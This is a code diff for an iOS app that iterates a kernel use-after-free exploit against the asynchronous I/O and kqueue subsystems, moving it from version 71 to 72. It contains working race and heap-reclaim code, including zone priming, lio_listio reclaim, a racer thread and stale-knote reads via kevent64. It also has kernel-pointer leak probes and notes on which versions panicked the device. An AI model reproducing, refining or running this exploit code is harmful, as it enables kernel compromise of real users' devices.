@@ -254,20 +254,20 @@ struct aio_race_state {
     ssize_t return_result;  // v47: aio_return result or aio_read errno (diagnostics)
 };
 
-// v71: 7+6 batched priming + plain C diag function + full-step markers.
-// Phase 0 is EMPTY — all probes pushed to Phase D (post-exploit).
-// v71 key fix: replaced block-based mark() with plain C v71_diag_mark().
-// Blocks in C/pthread functions may not execute before kernel panic.
-// Markers at every step: start, primed, tcb-submitted, racer-won/lost,
-// waited, pre-PhaseA, post-PhaseA, post-PhaseB survive panics.
-// independent leak channels (Phase D): (A) sysctl tcp.info, (B) proc_pidinfo,
-// (C) non-FastPath IOKit enumeration, (D) mach_port_kobject.
-// Key design:
-//   1. 13x zone priming, lio_listio batch reclaim (from v63)
-//   2. rcbs[0] SIGEV_KEVENT on kq2 — creates second knote to same slot S
-//   3. Phase A: kevent64(kq) — stale knote, entry on workq/doneq
-//   4. Phase B: kevent64(kq2) — fresh knote, entry on doneq (TAILQ_REMOVE test)
-//   5. Compare ext[] from both phases — if different, we learn about entry state
+// v72: Revert to 7x priming (v66's working config) + O_APPEND diag (no truncation).
+// Phase 0 RE-ADDED (was in v66, helped reliability by flushing zone magazines).
+// Key fixes over v70/v71:
+//   - O_APPEND diag: each marker appends → crash-resistant, all steps preserved
+//   - 7x priming (not 13): v66 was the ONLY success (1/7), v67-v71 all crashed
+//   - Phase 0 probes restored: zone-warming side effect reduced alien interference
+//   - Pre-flight diag from main thread verifies file I/O before exploit thread starts
+//   - Longer pre-PhaseA delay (2ms) to give AIO worker more scheduling time
+// Design:
+//   1. 7x zone priming, lio_listio batch reclaim (v63 mechanism)
+//   2. rcbs[0] SIGEV_KEVENT on kq2 — second knote to same slot S
+//   3. Phase A: kevent64(kq) — stale knote (tcb's old knote → reclaimed slot)
+//   4. Phase B: kevent64(kq2) — fresh knote (rcbs[0]'s knote → doneq entry)
+//   5. Compare ext[1] from both phases
 
 #define V63_NRECLAIM 7
 
@@ -350,32 +350,30 @@ static void *v63_racer(void *arg) {
     return NULL;
 }
 
-// v71: 7+6 batched priming + regular C diag function (no blocks) + full-step markers.
-// Key fix: replaced block-based `mark` with plain C function — blocks in C/pthread
+// v72 racer: spins aio_return directly, reclaims via lio_listio BATCH
 // may not write correctly before kernel panic. Also split 13x priming into 7+6 to
 // stay within iOS 8-entry-per-process AIO limit.
-static void v71_diag_mark(const char *path, const char *msg) {
+static void v72_diag_mark(const char *path, const char *msg) {
     if (!path || path[0] == '\0') return;
-    int dfd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    int dfd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0644);
     if (dfd >= 0) {
         write(dfd, msg, strlen(msg));
+        write(dfd, "\n", 1);
         fsync(dfd);
         close(dfd);
     }
 }
 
-static void *v63_exploit_thread(void *arg) {
+static void *v72_exploit_thread(void *arg) {
     struct v63_state *st = (struct v63_state *)arg;
     aio_set_thread_affinity(42);
     const char *dp = st->diag_path;
 
-    v71_diag_mark(dp, "start");
+    v72_diag_mark(dp, "start");
 
-    // v71: 13x Zone priming in TWO BATCHES (7+6).
-    // iOS limits ~8 concurrent AIO entries per process.
-    // Batch 1: submit 7, wait all, free all.
-    struct aiocb pcbs[13];
-    char pbufs[13][256];
+    // v72: 7x Zone priming (single batch — v66's working config).
+    struct aiocb pcbs[7];
+    char pbufs[7][256];
     for (int i = 0; i < 7; i++) {
         memset(&pcbs[i], 0, sizeof(pcbs[i]));
         pcbs[i].aio_fildes = st->fd;
@@ -390,23 +388,8 @@ static void *v63_exploit_thread(void *arg) {
         while (aio_error(&pcbs[i]) == EINPROGRESS) usleep(100);
         aio_return(&pcbs[i]);
     }
-    // Batch 2: submit 6, wait all, free all (13 total freed)
-    for (int i = 7; i < 13; i++) {
-        memset(&pcbs[i], 0, sizeof(pcbs[i]));
-        pcbs[i].aio_fildes = st->fd;
-        pcbs[i].aio_buf = pbufs[i];
-        pcbs[i].aio_nbytes = 1;
-        pcbs[i].aio_offset = 0;
-        pcbs[i].aio_lio_opcode = LIO_READ;
-        pcbs[i].aio_sigevent.sigev_notify = SIGEV_NONE;
-        aio_read(&pcbs[i]);
-    }
-    for (int i = 7; i < 13; i++) {
-        while (aio_error(&pcbs[i]) == EINPROGRESS) usleep(100);
-        aio_return(&pcbs[i]);
-    }
 
-    v71_diag_mark(dp, "primed");
+    v72_diag_mark(dp, "primed");
 
     int kq = kqueue();
     if (kq < 0) { st->err = errno; return NULL; }
@@ -451,7 +434,7 @@ static void *v63_exploit_thread(void *arg) {
     sig.sigev_notify = SIGEV_NONE;
     lio_listio(LIO_NOWAIT, &ptr, 1, &sig);
 
-    v71_diag_mark(dp, "tcb-submitted");
+    v72_diag_mark(dp, "tcb-submitted");
 
     // Start racer
     struct v63_race_state rs = {};
@@ -479,30 +462,30 @@ static void *v63_exploit_thread(void *arg) {
         aio_return(&tcb);
         close(kq);
         close(kq2);
-        v71_diag_mark(dp, "racer-lost");
+        v72_diag_mark(dp, "racer-lost");
         return NULL;
     }
 
     if (!reclaimed) {
         close(kq);
         close(kq2);
-        v71_diag_mark(dp, "reclaim-fail");
+        v72_diag_mark(dp, "reclaim-fail");
         return NULL;
     }
 
-    v71_diag_mark(dp, "racer-won");
+    v72_diag_mark(dp, "racer-won");
 
     // Wait for ALL reclaim entries to complete
     for (int i = 0; i < V63_NRECLAIM; i++)
         while (aio_error(&rcbs[i]) == EINPROGRESS) usleep(500);
 
-    v71_diag_mark(dp, "waited");
+    v72_diag_mark(dp, "waited");
 
-    // Yield before Phase A to give AIO worker a scheduling chance
+    // v72: 2ms yield before Phase A — give AIO worker more scheduling time
     sched_yield();
-    usleep(1000);
+    usleep(2000);
 
-    v71_diag_mark(dp, "pre-PhaseA");
+    v72_diag_mark(dp, "pre-PhaseA");
 
     // Phase A: kevent64(kq) — stale knote (tcb's old knote → reclaimed slot S)
     struct kevent64_s kev = {};
@@ -510,7 +493,7 @@ static void *v63_exploit_thread(void *arg) {
     st->nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
     if (st->nev > 0) st->kev = kev;
 
-    v71_diag_mark(dp, "post-PhaseA");
+    v72_diag_mark(dp, "post-PhaseA");
 
     // Phase B: kevent64(kq2) — fresh knote (rcbs[0]'s knote → doneq entry)
     struct kevent64_s kev2 = {};
@@ -518,18 +501,18 @@ static void *v63_exploit_thread(void *arg) {
     st->nev2 = kevent64(kq2, NULL, 0, &kev2, 1, 0, &ts2);
     if (st->nev2 > 0) st->kev2 = kev2;
 
-    v71_diag_mark(dp, "post-PhaseB");
+    v72_diag_mark(dp, "post-PhaseB");
 
     close(kq);
     close(kq2);
 
-    // Final diag with results
+    // Final diag with results (O_APPEND — accumulates with markers)
     {
-        int dfd = open(dp, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        int dfd = open(dp, O_WRONLY | O_CREAT | O_APPEND, 0644);
         if (dfd >= 0) {
             char dbuf[512];
             int dlen = snprintf(dbuf, sizeof(dbuf),
-                "freed=%d reclaimed=%d nevA=%d nevB=%d ret=%zd\n",
+                "result freed=%d reclaimed=%d nevA=%d nevB=%d ret=%zd\n",
                 freed, reclaimed ? 1 : 0, st->nev, st->nev2, ret_result);
             write(dfd, dbuf, dlen); fsync(dfd); close(dfd);
         }
@@ -618,7 +601,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *aioConf = [UIButtonConfiguration filledButtonConfiguration];
     aioConf.baseBackgroundColor = [UIColor systemOrangeColor];
     self.aioUafButton.configuration = aioConf;
-    [self.aioUafButton setTitle:@"AIO UAF v71" forState:UIControlStateNormal];
+    [self.aioUafButton setTitle:@"AIO UAF v72" forState:UIControlStateNormal];
     [self.aioUafButton addTarget:self action:@selector(aioUafTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.aioUafButton];
 
@@ -5986,7 +5969,7 @@ static void *e2_free_and_ool_racer(void *arg) {
 
 #pragma mark - Phase 0: Multi-Vector Kernel Pointer Probe
 
-// v71 Phase 0/D: Empty pre-exploit + full post-exploit leak probe.
+// v72 Phase 0/D: Pre-exploit zone-warming probes + post-exploit leak probe.
 // Tests four independent channels; each is non-destructive and
 // failure in one does not block the others.
 
@@ -6324,13 +6307,37 @@ static void *e2_free_and_ool_racer(void *arg) {
 }
 
 // Phase 0 (pre-exploit): EMPTY — absolutely nothing, preserve pristine zone state
-- (void)runPhase0Dummy {
-    [self appendLog:@"\n=== Phase 0 v71: (empty — pristine zone for AIO race) ==="];
+- (void)runPhase0Probes {
+    // v72: Phase 0 probes pre-exploit — zone-warming side effect reduces alien
+    // interference in tcb-zfree→rcbs-zalloc window (v66 was 1/7 success with probes).
+    [self appendLog:@"\n=== Phase 0 v72: Zone-Warming Leak Probes ==="];
+
+    [self appendLog:@"\n-- Phase0.A: sysctl net.inet.tcp.info --"];
+    @try { [self subtestSysctlTcpInfo]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.A exception: %@", e]]; }
+
+    [self appendLog:@"\n-- Phase0.B: proc_pidinfo scan --"];
+    @try { [self subtestProcPidinfo]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.B exception: %@", e]]; }
+
+    [self appendLog:@"\n-- Phase0.B2: KERN_PROCARGS2 --"];
+    @try { [self subtestKernProcargs]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.B2 exception: %@", e]]; }
+
+    [self appendLog:@"\n-- Phase0.C: IOKit enumeration --"];
+    @try { [self subtestIOKitEnumeration]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.C exception: %@", e]]; }
+
+    [self appendLog:@"\n-- Phase0.D: mach_port_kobject --"];
+    @try { [self subtestMachPortKobject]; }
+    @catch (NSException *e) { [self appendLog:[NSString stringWithFormat:@"Phase0.D exception: %@", e]]; }
+
+    [self appendLog:@"\n=== Phase 0 v72 Complete ==="];
 }
 
 // Phase D (post-exploit): ALL leak probes — exploit done, zone disturbance irrelevant
 - (void)runPostExploitLeakProbe {
-    [self appendLog:@"\n=== Phase D v71: Post-Exploit Full Leak Probe ==="];
+    [self appendLog:@"\n=== Phase D v72: Post-Exploit Full Leak Probe ==="];
 
     [self appendLog:@"\n-- PhaseD.A: sysctl net.inet.tcp.info --"];
     @try { [self subtestSysctlTcpInfo]; }
@@ -6375,11 +6382,11 @@ static void *e2_free_and_ool_racer(void *arg) {
         _aioLast = now;
     }
 
-    [self appendLog:@"\n========== AIO UAF v71 (7+6 Batched Prime + C Diag Fn + Full Markers) =========="];
+    [self appendLog:@"\n========== AIO UAF v72 (7x Prime + O_APPEND Diag + Phase0 Probes) =========="];
 
-    // ---- Phase 0 v71: Empty (pristine zone for AIO race) ----
-    [self appendLog:@"\n--- Phase 0 v71: (empty) ---"];
-    [self runPhase0Dummy];
+    // ---- Phase 0 v72: Zone-warming probes (reduces alien interference) ----
+    [self appendLog:@"\n--- Phase 0 v72: Zone-Warming Probes ---"];
+    [self runPhase0Probes];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -6393,17 +6400,28 @@ static void *e2_free_and_ool_racer(void *arg) {
 
     // diag persists across kernel panic / reboot
     NSString *docsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v71.txt"];
-    unlink(diagPath.UTF8String);
+    NSString *diagPath = [docsDir stringByAppendingPathComponent:@"diag_v72.txt"];
+    // v72: pre-flight diag from MAIN thread — verifies file I/O works before exploit thread
+    {
+        int pre = open(diagPath.UTF8String, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (pre >= 0) {
+            const char *preMsg = "main-ready";
+            write(pre, preMsg, strlen(preMsg));
+            write(pre, "\n", 1);
+            fsync(pre);
+            close(pre);
+        }
+        [self appendLog:[NSString stringWithFormat:@"diag pre-flight: %@ (fd=%d)", diagPath, pre]];
+    }
 
     // SINGLE file — all AIO ops use same fd
-    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v71.bin"];
+    NSString *aioPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v72.bin"];
     int fd = open(aioPath.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
     if (fd < 0) {
         [self appendLog:@"FAIL: could not create file"];
         dispatch_async(dispatch_get_main_queue(), ^{
             self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO UAF v71" forState:UIControlStateNormal];
+            [self.aioUafButton setTitle:@"AIO UAF v72" forState:UIControlStateNormal];
         });
         return;
     }
@@ -6417,8 +6435,8 @@ static void *e2_free_and_ool_racer(void *arg) {
     [self appendLog:[NSString stringWithFormat:@"diag=%@", diagPath]];
 
     uint64_t entryAddr = 0;
-    // ---- Phase A v71: 7+6 prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ----
-    [self appendLog:@"\n--- Phase A v71: 7+6 prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ---"];
+    // ---- Phase A v72: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ----
+    [self appendLog:@"\n--- Phase A v72: 7x prime → lio_listio trigger → racer → lio_listio batch reclaim → kevent64(kq) → kevent64(kq2) ---"];
 
     bool phaseA_won = false;
     for (int attempt = 0; attempt < 10; attempt++) {
@@ -6429,7 +6447,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         strncpy(st.diag_path, diagPath.UTF8String, sizeof(st.diag_path) - 1);
 
         pthread_t thr;
-        pthread_create(&thr, NULL, v63_exploit_thread, &st);
+        pthread_create(&thr, NULL, v72_exploit_thread, &st);
         pthread_join(thr, NULL);
 
         // Read diagnostic file
@@ -6514,8 +6532,8 @@ static void *e2_free_and_ool_racer(void *arg) {
 
     [self appendLog:[NSString stringWithFormat:@"\nWIN: entryAddr=0x%llx", entryAddr]];
 
-    // ---- Phase C v71: Health check ----
-    [self appendLog:@"\n--- Phase C v71: Health check ---"];
+    // ---- Phase C v72: Health check ----
+    [self appendLog:@"\n--- Phase C v72: Health check ---"];
     {
         struct aiocb hc[4];
         char hcbuf[4][256];
@@ -6537,18 +6555,18 @@ static void *e2_free_and_ool_racer(void *arg) {
         [self appendLog:[NSString stringWithFormat:@"  health check: %d/4 ok", hc_ok]];
     }
 
-    // ---- Phase D v71: Post-exploit full leak probe (zone-safe — exploit already done) ----
+    // ---- Phase D v72: Post-exploit full leak probe (zone-safe — exploit already done) ----
     [self runPostExploitLeakProbe];
 
 cleanup:
     close(fd);
     unlink(aioPath.UTF8String);
     [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
-    [self appendLog:@"========== AIO UAF v71 Complete =========="];
+    [self appendLog:@"========== AIO UAF v72 Complete =========="];
             _aioRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.aioUafButton.enabled = YES;
-                [self.aioUafButton setTitle:@"AIO UAF v71" forState:UIControlStateNormal];
+                [self.aioUafButton setTitle:@"AIO UAF v72" forState:UIControlStateNormal];
             });
         }  // @autoreleasepool
     });  // dispatch_async
